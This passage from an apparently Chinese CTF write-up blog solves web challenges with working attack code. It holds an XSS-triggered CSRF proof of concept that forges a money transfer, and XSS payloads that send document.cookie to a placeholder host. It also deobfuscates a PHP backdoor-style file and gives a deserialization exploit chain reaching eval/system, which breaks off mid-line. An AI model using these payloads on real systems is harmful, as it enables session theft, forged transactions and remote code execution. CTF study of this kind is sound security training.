+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://xxx.xxx.xxx.xxx/drinkteaVIP.html&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>发送请求</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004043.png" srcset="/img/loading.gif" lazyload alt="image-20221123101127213"></p>
+<p>再打开主页</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004044.png" srcset="/img/loading.gif" lazyload alt="image-20221123101735914"></p>
+<p>已经成功升级为VIP</p>
+<p>接着查看双皮奶，结果发现</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">钱不够捏，要999999999999元<br></code></pre></td></tr></table></figure>
+
+<p>接下来获取money</p>
+<p>有一个转账的trans.php，抓包发现post请求，username为转款对象，money为钱数</p>
+<p>转款 exp：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">		<span class="hljs-keyword">function</span> <span class="hljs-title function_">evil</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">			<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;postsubmit&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">		&#125;</span><br><span class="language-javascript">	</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  	<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&quot;evil()&quot;</span>,<span class="hljs-number">0.1</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://mc.vveelin.com.cn:8102/trans.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;money&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;999999999999&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postsubmit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>一样的步骤，反馈给管理员</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://xxx/drinktea.html&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004045.png" srcset="/img/loading.gif" lazyload alt="image-20221123102719998"></p>
+<p>下单</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004046.png" srcset="/img/loading.gif" lazyload alt="image-20221123102803017"></p>
+<p>其实一开始想的是CSRF+XSS获取cookie，因为没看到mng的页面提示</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;http://xxx/?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://xxx/?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>只试了一下XSS，没有成功带出数据，后面CSRF+XSS也没成功</p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004047.png" srcset="/img/loading.gif" lazyload alt="image-20221121094709179"></p>
+<p>扫目录扫到一个</p>
+<p>index.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$O00OO0</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<span class="hljs-variable">$O00O0O</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-variable">$O0OO00</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$OO0O00</span>=<span class="hljs-variable">$O0OO00</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$O0OO00</span>&#123;<span class="hljs-number">0</span>&#125;    <br>        .<span class="hljs-variable">$O0OO00</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$OO0000</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$O00O0O</span>.=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">36</span>&#125;    <br>        .<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;    <br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$O00O0O</span>(<span class="hljs-string">&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;</span>));<span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>echo一下，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$O00OO0</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$base64</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$ggstrtr</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$ggsubstr</span>=<span class="hljs-variable">$ggstrtr</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$ggstrtr</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$ggstrtr</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$gg52</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">13</span>&#125;;<br><span class="hljs-variable">$base64</span>.=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;<br>        <span class="hljs-variable">$O0O000</span>=<span class="hljs-string">&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;</span>;  <br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$base64</span>(<span class="hljs-variable">$ggstrtr</span>(<span class="hljs-variable">$ggsubstr</span>(<span class="hljs-variable">$O0O000</span>,<span class="hljs-variable">$gg52</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$ggsubstr</span>(<span class="hljs-variable">$O0O000</span>,<span class="hljs-variable">$gg52</span>,<span class="hljs-variable">$gg52</span>),    <br>        <span class="hljs-variable">$ggsubstr</span>(<span class="hljs-variable">$O0O000</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$gg52</span>))));<br>        <span class="hljs-comment">// eval($base64(&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;));</span><br><br>        <span class="hljs-comment">/*$O0O000=&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;;  </span><br><span class="hljs-comment">        eval(&#x27;?&gt;&#x27;.$base64($ggstrtr($ggsubstr($O0O000,$gg52*2),$ggsubstr($O0O000,$gg52,$gg52),    </span><br><span class="hljs-comment">        $ggsubstr($O0O000,0,$gg52))));*/</span><br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>最后得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BillyHerrington</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; a = <span class="hljs-string">&quot;fxxk you &quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt; a.<span class="hljs-string">&quot;Wow&quot;</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Baoglady</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; b -&gt; <span class="hljs-title function_ invoke__">happy</span>(<span class="hljs-variable">$this</span> -&gt; c);<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VanDarkholme</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">happy</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;str&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>很简单的链子</p>
+<p>exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BillyHerrington</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>        <span class="hljs-comment">// public function __wakeup()</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//         $this -&gt; a = &quot;fxxk you &quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br><br>        <span class="hljs-comment">// public function __destruct()</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//         echo $this -&gt; a.&quot;Wow&quot;;</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Baoglady</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br><br>        <span class="hljs-comment">// public function __toString()</span><br>        <span class="hljs-comment">// &#123;</span><br>        <span class="hljs-comment">//         $this -&gt; b -&gt; happy($this -&gt; c);</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VanDarkholme</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$d</span>;<br><br>        <span class="hljs-comment">// public function happy($cmd)&#123;</span><br>        <span class="hljs-comment">//         eval($cmd);</span><br>        <span class="hljs-comment">// &#125;</span><br>&#125;<br><br><span class="hljs-variable">$Van</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">VanDarkholme</span>();<br><br><span class="hljs-variable">$Bao</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Baoglady</span>();<br><span class="hljs-variable">$Bao</span>-&gt;b=<span class="hljs-variable">$Van</span>;<br><span class="hljs-variable">$Bao</span>-&gt;c=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br><br><span class="hljs-variable">$Bill</span>=<span 